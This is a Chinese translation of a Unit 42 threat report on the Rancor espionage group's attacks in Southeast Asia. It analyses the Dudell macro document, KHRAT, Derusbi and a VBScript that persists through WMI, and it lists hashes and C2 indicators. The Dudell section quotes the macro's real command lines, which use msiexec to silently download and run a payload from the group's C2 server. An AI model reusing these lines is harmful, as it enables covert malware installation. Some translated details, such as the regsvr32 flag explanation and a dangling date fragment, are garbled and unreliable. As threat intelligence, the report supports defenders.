**在2018年6月下旬，研究人员发现了一个未知的网络间谍组织Rancor，该组织在2017年和2018年期间在东南亚进行了有针对性的攻击。在研究这些攻击时发现了一个未记录的自定义恶意软件家族Dudell。**

## 攻击细节

在2018年12月上旬至2019年1月下旬之间，Rancor进行了至少两轮攻击，在受害者系统上安装Derusbi或KHRat恶意软件。
2019年1月通过149.28.156 [.] 61发送，以cswksfwq.kfesv [.]xyz或connect.bafunpda [.]
xyz作为C2。

## 样本分析

### DUDELL

![](https://image.3001.net/images/20191219/1576716983_5dfacab7dc1ee.png!small)

DUDELL是经过处理的Microsoft Excel文档，其中包含恶意宏。 SHA-1
c829f5f9f89210c888c1559bb085ec6e65232de。 以下为其元数据信息：

![](https://image.3001.net/images/20191219/1576717058_5dfacb026a673.png!small)

当用户查看文档并单击“启用内容”时，将执行该文档中的宏，这时该宏将定位并执行位于文档属性中“公司”字段下的数据。 位于公司字段下的数据是：

    
    
    cmd /c set /p=Set v=CreateObject(^”Wscript.Shell^”):v.Run ^”msiexec /q /i http://199.247.6[.]253/ud^”,false,0 <nul > C:\Windows\System32\spool\drivers\color\tmp.vbs

C2服务器199.247.6 [。] 253由Rancor组使用。 该脚本通过Microsoft工具msiexec下载第二阶段的有效负载。 在目录c：\
Windows \ System32 \ spool \ drivers \
color中发现了文件office.vbs（SHA256：4b0b319***c2c0980390e24379a2e2a0a1e1a91d17a9d3e26be6f4a39a7afad2）。
该文件的内容是：

    
    
    Set v=CreateObject(“Wscript.Shell”):v.Run “msiexec /q /i http://199.247.6[.]253/OFFICE”,false,0
    
    
    SHA256 b958e481c90939962081b9fb85451a2fb28f705d5***60f5d9d5aebfb390f832

如果tmp.vbs文件包含与office.vbs文件相似的内容，可能是下载有效载荷另一种方法。

### DDKONG Plugin

恶意软件配置有以下导出条目：  

![](https://image.3001.net/images/20191219/1576718796_5dfad1ccbe2aa.png!small)

  

### DllInstall

DllInstall检查带有标题“ Hello Google”的隐藏窗口 和Google的类名，请参见下面的图1。
执行此检查以确保一次仅运行一个恶意软件实例。

![](https://image.3001.net/images/20191219/1576719801_5dfad5b91a368.png!small)

恶意软件创建的隐藏窗口会在用户输入（例如键盘或鼠标活动）上进行过滤。 为了避沙盒分析通常不执行鼠标和键盘。
然后，恶意软件将信标发送到TCP端口8080上已配置的cswksfwq.kfesv [.]
xyz远程服务器。成功连接后，恶意软件将传输受害者信息，例如：主机名，IP地址，语言包以及其他操作系统信息。 传输的数据经过XOR编码。
该恶意软件支持以下功能：

> 终止特定进程
>
> 枚举进程
>
> 上传文件
>
> 下载文件
>
> 删除文件
>
> 列出文件夹内容
>
> 枚举存储卷
>
> 执行命令
>
> 反向shell
>
> 截图

## KHRAT

![](https://image.3001.net/images/20191219/1576720626_5dfad8f259543.png!small)

### Rmcmd

最初加载DLL时，它会动态解析并导入所需的其他模块（DLL）。 加载并调用Rmcmd后，它将创建一个名为gkdflbmdfk的Windows互斥锁。
这样可以确保一次仅运行一个恶意软件。 然后它开始向TCP端口8081上connect.bafunpda [.]
xyz的域发出信号。恶意软件从主机收集并传输数据，例如主机名，并以网络流量的第一个字节为密钥进行XOR编码，该恶意软件可反向shell。

恶意软件的行为和代码与2018年5月的KHRAT样本有相似之处。示例（SHA256:bc1c3e754be9f2175b718aba62174a550cdc3d98ab9c36671a58073140381659）具有相同的导出条目名称，也是一个反向shell。新的样本是出于优化目的而重新编写的，底层行为保持不变。

## Derusbi

![](https://image.3001.net/images/20191219/1576720833_5dfad9c156ff1.png!small)

Derusbi是后门木马，检测到的样本是一个加载程序，可为其功能加载加密的有效负载。
此DLL加载的可执行文件需要在命令行上包含32字节的密钥，以解密嵌入的有效负载，加载流程如下：

> 1、如果加载样本的模块名为myapp.exe，则该模块将退出
>
> 2、加载后，它会休眠六秒钟
>
> 3、查找名为\\\\.\ pipe \ _kernel32.dll.ntdll.dll.use***.dll的Windows通道
>
> 4、查找名为\ Device \ acpi_010221的Windows设备
>
> 5、创建以下注册表项
>
> HKEY_CLASSES_ROOT \ CDO.SS_NNTPOnPostEarlySink.2名为IDX和Ver的DWORD值。
>
> 6、保存加密的数据
>
> 7、解密嵌入式有效负载

## Rancor VBScript

在2019年7月发现VBScript，名为Chrome.vbs（SHA256：0C3D4DFA566F3064A8A408D3E1097**54662860BCACFB6675D2B72739CE449C2）。
VBScript有效载荷指向域bafunpda [.]xyz，KHRAT
Trojan也使用此域。该VBScript被混淆，并包含打包数据，下面为VBScript的执行流程：

![](https://image.3001.net/images/20191219/1576721211_5dfadb3bd7b01.png!small)

> 1、将regsv***.exe从％windir％\ syswow64复制到％windir％\ spoolsw.exe。
>
> 2、在主机的％TMP％文件夹中创建一个名为vdfjgklffsdfmv.txt的文本文件。 该文件不是文本文件，而是Windows管理对象文件MOF。
>
> 3、执行Windows mofcomp.exe，并传入在步骤2中创建的MOF文件。
>
> 4、将数据添加到两个注册表项：classes和media。 数据保存在默认键中。
>
> 5、从步骤4中创建的注册表项类中读取数据的Blob，并将数据保存到文件％windir％\ pla.dat。

VBScript创建的MOF文件通过Windows Management
Instrumentation达到稳定控制的目的。MOF文件创建一个计时器事件，该事件每五秒钟触发一次。 MOF文件的片段如下图所示：

![](https://image.3001.net/images/20191219/1576721370_5dfadbda75d02.png!small)

上图显示了MOF文件的主要功能。 它具有唯一的事件日志过滤器，并且每5秒运行spoolsw.exe，并将/ s / n /
i参数传入文件pla.dat，参数指示regsv***不要显示任何消息框（/
s），不要调用DllRegisterServer或DllUnregisterServer（/ n），不要调用DllInstall（/ i）。

VBScript创建的注册表值如下：

    
    
    HKEY_CURRENT_USER \ Software \ Classes

HKEY_CURRENT_USER \ Software \ Classes中注册表数据的文件属性

![](https://image.3001.net/images/20191219/1576721495_5dfadc57192c9.png!small)

嵌入在此注册表项中的DLL是一个简单的加载程序，可从注册表HKEY_LOCAL_MACHINE \ SOFTWARE \ Clients \
Media中加载代码

HKEY_LOCAL_MACHINE \ SOFTWARE \ Clients \ Media包含DLL的shellcode和x86代码，数据使用
与key值0x9C异或进行编码。

![](https://image.3001.net/images/20191219/1576721593_5dfadcb920a30.png!small)

位于Media注册表项中的DLL是KHRAT木马的一种变体。 它向域connect.bafunpda [.]
xyz发出信号，并尝试连接到TCP端口4433。与KHRAT木马使用的相同域，并具有相同的行为。

## 总结

Rancor从2017年开始活跃且一直在东南亚进行有针对性的攻击，它使用的是自定义恶意软件家族Dudell，一旦执行恶意宏就会下载第二阶段有效负载并执行。Rancor还使用Derusbi恶意软件在渗透目标后进行辅助加载外部程序。

## IoCs

### SHA256:

> 0EB1D6541688B5C87F620E76219EC5DB8A6F05732E028A9EC36195D7B4F5E707
>
> AAEBF987B8D80D71313C3C0F2C16D60874FFECBDDA3BB6B44D6CBA6D38031609
>
> 0D61D9BAAB9927BB484F3E60384FDB6A3709CA74BC6175AB16B220A68F2B349E
>
> DB982B256843D8B6429AF24F766636BB0BF781B471922902D8DCF08D0C58511E
>
> CC081FFEA6F4769733AF9D0BAE0308CA0AE63667FA225E7965DF0884E96E2D2A
>
> BC1C3E754BE9F2175B718ABA62174A550CDC3D98AB9C36671A58073140381659
>
> 83d1d181a6d583bca2f03c3c4e517757a766da5f4c1299fbbe514b3e2abd9e0d

### C2s

> cswksfwq.kfesv[.]xyz
>
> Connect.bafunpda[.]xyz
>
> 199.247.6[.]253

 ***参考来源：[unit42](https://unit42.paloaltonetworks.com/rancor-cyber-espionage-group-uses-new-custom-malware-to-attack-southeast-asia/)，由Kriston编译，转载请注明来自FreeBuf.COM**

